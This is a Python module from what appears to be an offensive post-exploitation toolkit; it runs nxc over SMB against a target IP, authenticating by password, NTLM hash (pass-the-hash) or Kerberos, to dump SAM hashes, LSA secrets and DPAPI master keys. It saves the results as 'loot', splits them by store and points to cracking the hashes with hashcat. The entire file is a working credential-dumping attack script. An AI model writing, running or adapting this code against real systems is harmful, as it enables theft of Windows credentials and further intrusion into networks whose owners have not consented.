# modules/dump_secrets.py

import os
import shutil
from core.helpers import get_auth_args, save_loot, run_command
from core.colors import red, green, blue, yellow

def dump_all(session):
    print(blue(f"[*] Dumping LSA, SAM, and DPAPI secrets from {session.target_ip} using nxc..."))

    if not shutil.which("nxc"):
        print(red("[-] 'nxc' not found in PATH. Please install or symlink it."))
        print(yellow("[!] Visit: https://github.com/NekoSnake/nxc"))
        return

    # === Construct proper auth for nxc
    if session.hash:
        auth = f"-d {session.domain} -u {session.username} -H {session.hash}"
    elif session.password:
        auth = f"-d {session.domain} -u {session.username} -p \"{session.password}\""
    else:
        auth = f"-d {session.domain} -u {session.username} -k"

    cmd = f"nxc smb {session.target_ip} {auth} --sam --lsa --dpapi"
    out, err = run_command(cmd)
    combined = out + "\n" + err

    # === Heuristics for success
    if not any(kw in combined.lower() for kw in ["lsa", "sam", "dpapi", "secret", "hash"]):
        print(red("[-] Dump likely failed. No secrets found."))
        if "access denied" in combined.lower():
            print(yellow("[!] You may need SYSTEM privileges or SeBackupPrivilege."))
        print(combined.strip())
        return

    # === Save full dump
    full_path = f"secrets_{session.target_ip}.txt"
    save_loot(full_path, combined)
    print(green(f"[+] Full dump saved to loot/{full_path}"))

    # === Optionally split into parts
    parts = {"lsa": [], "sam": [], "dpapi": []}
    current = None

    for line in combined.splitlines():
        l = line.lower()
        if "lsa secrets" in l:
            current = "lsa"
        elif "sam hashes" in l or "account:" in l:
            current = "sam"
        elif "dpapi" in l or "masterkey" in l:
            current = "dpapi"
        if current:
            parts[current].append(line)

    for section, lines in parts.items():
        if lines:
            filename = f"{section}_{session.target_ip}.txt"
            save_loot(filename, "\n".join(lines))
            print(green(f"[+] {section.upper()} secrets saved to loot/{filename}"))

    print(blue("[*] You can now attempt to extract more or crack hashes with hashcat."))
